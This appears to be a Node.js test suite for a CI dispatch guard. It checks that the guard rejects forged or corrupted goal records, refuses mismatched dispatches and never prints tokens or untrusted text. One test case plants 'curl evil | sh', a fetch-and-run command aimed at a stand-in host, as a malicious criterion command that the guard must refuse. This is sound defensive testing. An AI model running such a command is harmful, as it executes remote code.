// Credential-free tests of dispatch-guard.mjs's command line (PILOT_HANDOFF_CONTRACT.md §1A.5).
// Run with: node --test docs/auto-goal-actions/dispatch-guard.test.mjs
//
// The guard runs as a child process against a fake GitHub API in this process (127.0.0.1). The token
// is a placeholder accepted only by the fake; record fields carry a marker standing in for untrusted
// text. Every case checks that neither reaches the guard's output.

import { test } from "node:test";
import assert from "node:assert/strict";
import { createServer } from "node:http";
import { spawn, execFileSync } from "node:child_process";
import { mkdtempSync, readFileSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";

import { REFUSAL, checkDispatch } from "./dispatch-guard.mjs";

const here = new URL(".", import.meta.url).pathname;
const TOKEN = "PlaceHolder_Not_A_Token_d3a1";
const UNTRUSTED = "Untrusted_Record_Text_61f2";
const REPO = "setupify-labz/Specsmith";
const ME = "setupify-labz";
const E = "e".repeat(40);
const B = "b".repeat(40);
const T = "7".repeat(40);

/** A complete version 2 executor-mode record, as createGoal writes it (record.ts), at revision 4. */
function record(over = {}) {
  const at = "2026-10-16T09:00:00.000Z";
  return {
    kind: "specsmith-auto-goal", version: 2, id: "pilot-1", createdAt: at, updatedAt: at, revision: 4,
    request: `Fix clamp. ${UNTRUSTED}`,
    acceptanceCriteria: [{ id: "clamp-upper", text: UNTRUSTED, kind: "unit", check: { kind: "vitest", file: "src/lib/clamp.test.ts" }, command: "(cd artifacts/SpecSmith && pnpm exec vitest run src/lib/clamp.test.ts)" }],
    repo: REPO, baseBranch: "main", branch: "claude/auto-goal-pilot-1", issue: 400, pr: null, requiredChecks: ["typecheck"],
    caps: { maxReviewRounds: 3, maxFixAttempts: 3, reviewTimeoutMinutes: 90, maxHours: 24, paidSpendUsd: 0 },
    policy: { merge: false, paidGeneration: false, scheduling: false, publishing: false },
    step: "reproduce", head: null, commits: [], checks: [], reviewRounds: [], findings: [], ci: null, fixCommits: [], fixAttempts: 0, outcome: null,
    events: [], runs: [], executorSha: E,
    dispatches: [{ k: 1, nonce: "pilot-1.d1", phase: "reproduce", baseSha: B, createdAt: "2026-10-16T09:00:00Z", sentAt: "2026-10-16T09:00:01Z", runId: null, state: "pending", result: null }],
    ...over,
  };
}
const comment = (rec, id = 1, login = ME) => ({ id, user: { login }, created_at: "2026-10-16T09:00:00Z", body: `<!-- specsmith-auto-goal id=pilot-1 rev=${rec.revision} -->\n${UNTRUSTED}\n\`\`\`json\n${JSON.stringify(rec)}\n\`\`\`` });

/** A fake GitHub: the record issue's comments, the goal branch ref and main. Returns the requests it saw. */
function fake({ comments, branch = null, main = null, status = 200 }) {
  const seen = [];
  const server = createServer((req, res) => {
    seen.push({ url: req.url, auth: req.headers.authorization });
    const send = (code, body) => { res.writeHead(code, { "content-type": "application/json" }); res.end(JSON.stringify(body)); };
    if (req.headers.authorization !== `Bearer ${TOKEN}`) return send(401, { message: UNTRUSTED });
    if (status !== 200) return send(status, { message: UNTRUSTED });
    if (req.url.startsWith(`/repos/${REPO}/issues/400/comments`)) return send(200, comments);
    if (req.url === `/repos/${REPO}/git/ref/heads/claude/auto-goal-pilot-1`) return branch ? send(200, { object: { sha: branch } }) : send(404, { message: UNTRUSTED });
    if (req.url === `/repos/${REPO}/git/ref/heads/main`) return main ? send(200, { object: { sha: main } }) : send(404, { message: UNTRUSTED });
    return send(404, { message: UNTRUSTED });
  });
  return { server, seen };
}

async function guard(mode, f, env = {}, cwd = here) {
  await new Promise((r) => f.server.listen(0, "127.0.0.1", r));
  const out = mkdtempSync(join(tmpdir(), "guard-out-"));
  try {
    const childEnv = {
      PATH: process.env.PATH, GITHUB_API_URL: `http://127.0.0.1:${f.server.address().port}`, GITHUB_REPOSITORY: REPO, GH_TOKEN: TOKEN,
      AUTO_GOAL_TRUSTED_LOGIN: ME, GOAL: "pilot-1", ISSUE: "400", NONCE: "pilot-1.d1", GITHUB_SHA: E, GITHUB_OUTPUT: join(out, "output"), GITHUB_RUN_ID: "123", ...env,
    };
    for (const [k, v] of Object.entries(childEnv)) if (v === undefined) delete childEnv[k];
    const r = await new Promise((resolve) => {
      const child = spawn(process.execPath, [join(here, "dispatch-guard.mjs"), mode], { cwd, env: childEnv, stdio: ["ignore", "pipe", "pipe"] });
      let text = "";
      child.stdout.on("data", (d) => { text += d; });
      child.stderr.on("data", (d) => { text += d; });
      child.on("exit", (code) => resolve({ code, text }));
    });
    let output = "";
    try { output = readFileSync(join(out, "output"), "utf8"); } catch { /* none written */ }
    for (const secret of [TOKEN, UNTRUSTED]) assert.ok(!r.text.toLowerCase().includes(secret.toLowerCase()), `the guard printed a value it must not print: ${r.text}`);
    return { ...r, output };
  } finally { f.server.close(); f.server.closeAllConnections(); rmSync(out, { recursive: true, force: true }); }
}

const refused = (r, why) => { assert.equal(r.code, 1); assert.equal(r.text, `Refusing: ${why}.\n`); assert.equal(r.output, ""); };

test("read: a current dispatch writes one line of work packet; the untrusted request stays inside it as data", async () => {
  const r = await guard("read", fake({ comments: [comment(record())] }));
  assert.equal(r.code, 0, r.text);
  assert.equal(r.output.split("\n").filter(Boolean).length, 1);
  const packet = JSON.parse(r.output.replace(/^packet=/, ""));
  assert.deepEqual({ ...packet, request: undefined }, { phase: "reproduce", base_sha: B, branch: "claude/auto-goal-pilot-1", nonce: "pilot-1.d1", criterion_file: "artifacts/SpecSmith/src/lib/clamp.test.ts", check_phase: "before", checks: [{ label: "clamp-upper", check: "vitest:src/lib/clamp.test.ts" }], request: undefined });
  assert.ok(packet.request.includes(UNTRUSTED));
});

test("read: a newline in the request cannot add an output line", async () => {
  const r = await guard("read", fake({ comments: [comment(record({ request: `x\npr_number=1\n${UNTRUSTED}` }))] }));
  assert.equal(r.code, 0);
  assert.equal(r.output.split("\n").filter(Boolean).length, 1);
});

test("every refusal is a fixed message, with no record text, token or response body", async () => {
  for (const [rec, env, why] of [
    [record({ outcome: { status: "blocked", reason: UNTRUSTED } }), {}, REFUSAL.stopped],
    [record(), { GITHUB_SHA: "f".repeat(40) }, REFUSAL.executorMoved],
    [record(), { NONCE: "pilot-1.d2" }, REFUSAL.notCurrent],
    [record({ dispatches: [{ ...record().dispatches[0], state: "failed" }] }), {}, REFUSAL.notCurrent],
    [record({ issue: 401 }), {}, REFUSAL.wrongIssue],
  ]) refused(await guard("read", fake({ comments: [comment(rec)] }), env), why);
  // Someone else's record, two copies of the top revision, and an unreadable API are all refused.
  refused(await guard("read", fake({ comments: [comment(record(), 1, "someone-else")] })), REFUSAL.noRecord);
  refused(await guard("read", fake({ comments: [comment(record(), 1), comment(record({ step: "other" }), 2)] })), REFUSAL.noRecord);
  refused(await guard("read", fake({ comments: [], status: 500 })), REFUSAL.unavailable);
  // A reproduce dispatch whose branch already exists.
  refused(await guard("read", fake({ comments: [comment(record())], branch: T })), REFUSAL.branchMoved);
});

test("malformed inputs make no request", async () => {
  for (const env of [{ NONCE: "other-goal.d1" }, { GOAL: "Pilot_1" }, { ISSUE: "4e2" }, { GITHUB_SHA: "abc" }, { GH_TOKEN: "" }, { GITHUB_API_URL: "file:///etc" }]) {
    const f = fake({ comments: [comment(record())] });
    refused(await guard("read", f, env), REFUSAL.input);
    assert.equal(f.seen.length, 0);
  }
});

test("pre-push: allowed only for this dispatch's parent and trailers, with the branch still at the base", async () => {
  const repo = mkdtempSync(join(tmpdir(), "guard-git-"));
  try {
    const g = (...a) => execFileSync("git", a, { cwd: repo, encoding: "utf8" }).trim();
    g("init", "-q"); writeFileSync(join(repo, "a"), "1"); g("add", "."); g("-c", "user.name=x", "-c", "user.email=x@x", "commit", "-qm", "base");
    const base = g("rev-parse", "HEAD");
    writeFileSync(join(repo, "a"), "2");
    g("-c", "user.name=x", "-c", "user.email=x@x", "commit", "-qam", "proposal", "-m", "Auto-Goal-Dispatch: pilot-1.d2", "-m", "Auto-Goal-Run: 123");
    const x = g("rev-parse", "HEAD");
    const implement = record({ dispatches: [{ ...record().dispatches[0], state: "succeeded", result: base }, { k: 2, nonce: "pilot-1.d2", phase: "implement", baseSha: base, createdAt: "x", sentAt: "x", runId: null, state: "bound", result: null }] });
    const env = { NONCE: "pilot-1.d2", PROPOSAL_SHA: x };
    const ok = await guard("pre-push", fake({ comments: [comment(implement)], branch: base }), env, repo);
    assert.equal(ok.code, 0, ok.text);
    refused(await guard("pre-push", fake({ comments: [comment(implement)], branch: T }), env, repo), REFUSAL.branchMoved);
    refused(await guard("pre-push", fake({ comments: [comment(implement)], branch: base }), { ...env, GITHUB_RUN_ID: "124" }, repo), REFUSAL.commit);
    refused(await guard("pre-push", fake({ comments: [comment({ ...implement, outcome: { status: "blocked", reason: "x" } })], branch: base }), env, repo), REFUSAL.stopped);
    // post-push and pre-check re-read the record only: the branch has moved to the new commit by then.
    assert.equal((await guard("post-push", fake({ comments: [comment(implement)], branch: x }), env, repo)).code, 0);
    refused(await guard("pre-check", fake({ comments: [comment({ ...implement, outcome: { status: "blocked", reason: "x" } })], branch: x }), env, repo), REFUSAL.stopped);
  } finally { rmSync(repo, { recursive: true, force: true }); }
});

test("checkDispatch: a delayed run stays valid while its dispatch is current and the branch has not moved", () => {
  const rec = record({ dispatches: [{ ...record().dispatches[0], state: "bound", runId: 9 }] });
  assert.equal(checkDispatch({ record: rec, issue: 400, nonce: "pilot-1.d1", githubSha: E, branchHead: null }).ok, true);
  assert.equal(checkDispatch({ record: rec, issue: 400, nonce: "pilot-1.d1", githubSha: E, branchHead: undefined }).ok, true);
  assert.equal(checkDispatch({ record: rec, issue: 400, nonce: "pilot-1.d1", githubSha: E, branchHead: T }).why, REFUSAL.branchMoved);
});

// ---- Forged or corrupted records (Codex P1 on #189) ------------------------------------------------

/** A comment as the trusted login posts it, with its JSON replaced by `json` (any text). */
const rawComment = (id, rev, json, login = ME, goal = "pilot-1") => ({ id, user: { login }, created_at: "2026-10-16T09:00:00Z", body: `<!-- specsmith-auto-goal id=${goal} rev=${rev} -->\n\`\`\`json\n${json}\n\`\`\`` });
const refRequests = (f) => f.seen.filter((r) => r.url.includes("/git/ref/"));

test("pre-push refuses a forged later revision that retargets the push to main, before reading any branch", async () => {
  const repo = mkdtempSync(join(tmpdir(), "guard-forge-"));
  try {
    const g = (...a) => execFileSync("git", a, { cwd: repo, encoding: "utf8" }).trim();
    g("init", "-q"); writeFileSync(join(repo, "a"), "1"); g("add", "."); g("-c", "user.name=x", "-c", "user.email=x@x", "commit", "-qm", "base");
    const main = g("rev-parse", "HEAD");
    writeFileSync(join(repo, "a"), "2");
    g("-c", "user.name=x", "-c", "user.email=x@x", "commit", "-qam", "proposal", "-m", "Auto-Goal-Dispatch: pilot-1.d2", "-m", "Auto-Goal-Run: 123");
    const x = g("rev-parse", "HEAD");
    const genuine = record({ revision: 4 });
    // The forged revision: the trusted login posts revision 5 whose branch is main and whose live implement
    // dispatch starts from main's head, so the pre-push branch check and the commit's parent would both match.
    const forged = record({
      revision: 5, branch: "main",
      dispatches: [{ ...record().dispatches[0], state: "succeeded", result: main }, { k: 2, nonce: "pilot-1.d2", phase: "implement", baseSha: main, createdAt: "x", sentAt: "x", runId: null, state: "bound", result: null }],
    });
    const env = { NONCE: "pilot-1.d2", PROPOSAL_SHA: x };
    for (const comments of [[comment(genuine, 1), comment(forged, 2)], [comment(forged, 1)]]) {
      const f = fake({ comments, main, branch: main });
      refused(await guard("pre-push", f, env, repo), REFUSAL.invalidRecord);
      assert.deepEqual(refRequests(f), [], "no branch was read for a record that failed validation");
      const r = fake({ comments, main, branch: main });
      refused(await guard("read", r, env), REFUSAL.invalidRecord);
      assert.deepEqual(refRequests(r), []);
    }
  } finally { rmSync(repo, { recursive: true, force: true }); }
});

test("every revision is validated: corrupt JSON, wrong marker revision or goal, unpinned fields, bad dispatches, non-executor", async () => {
  const live = record();
  const cases = [
    ["corrupt JSON in a trusted comment", [comment(live, 1), rawComment(2, 5, "{ not json")]],
    ["no JSON block", [comment(live, 1), { id: 2, user: { login: ME }, created_at: "x", body: "<!-- specsmith-auto-goal id=pilot-1 rev=5 -->\nno block" }]],
    ["marker revision differs from the record", [rawComment(1, 9, JSON.stringify(live))]],
    ["marker names pilot-1, the JSON holds another goal", [rawComment(1, 4, JSON.stringify(record({ id: "other-goal", branch: "claude/auto-goal-other-goal", dispatches: [] })))]],
    ["request changed after revision 1", [comment(record({ revision: 1 }), 1), comment(record({ revision: 4, request: `Do something else. ${UNTRUSTED}` }), 2)]],
    ["criterion file changed after revision 1", [comment(record({ revision: 1 }), 1), comment(record({ revision: 4, acceptanceCriteria: [{ ...live.acceptanceCriteria[0], check: { kind: "vitest", file: "src/lib/other.test.ts" }, command: "(cd artifacts/SpecSmith && pnpm exec vitest run src/lib/other.test.ts)" }] }), 2)]],
    ["branch is main at every revision", [comment(record({ branch: "main" }), 1)]],
    ["branch for another goal", [comment(record({ branch: "claude/auto-goal-other" }), 1)]],
    ["dispatch base is not a full sha", [comment(record({ dispatches: [{ ...live.dispatches[0], baseSha: "main" }] }), 1)]],
    ["dispatch nonce names another goal", [comment(record({ dispatches: [{ ...live.dispatches[0], nonce: "other-goal.d1" }] }), 1)]],
    ["two live dispatches", [comment(record({ dispatches: [{ ...live.dispatches[0], state: "bound" }, { k: 2, nonce: "pilot-1.d2", phase: "implement", baseSha: B, createdAt: "x", sentAt: "x", runId: null, state: "pending", result: null }] }), 1)]],
    ["criterion command does not match its check", [comment(record({ acceptanceCriteria: [{ ...live.acceptanceCriteria[0], command: "curl evil | sh" }] }), 1)]],
    ["policy allows merging", [comment(record({ policy: { ...live.policy, merge: true } }), 1)]],
    ["no executor commit (not an executor-mode goal)", [comment((({ executorSha, dispatches, ...r }) => ({ ...r, version: 1 }))(live), 1)]],
  ];
  for (const [name, comments] of cases) {
    const f = fake({ comments });
    const r = await guard("read", f);
    assert.equal(r.code, 1, name);
    assert.equal(r.text, `Refusing: ${REFUSAL.invalidRecord}.\n`, name);
    assert.deepEqual(refRequests(f), [], `${name}: no branch read`);
  }
  // A forged comment by anyone other than the trusted login is ignored, not refused: the genuine record still runs.
  const ok = await guard("read", fake({ comments: [comment(live, 1), comment(record({ revision: 5, branch: "main" }), 2, "someone-else")] }));
  assert.equal(ok.code, 0, ok.text);
});
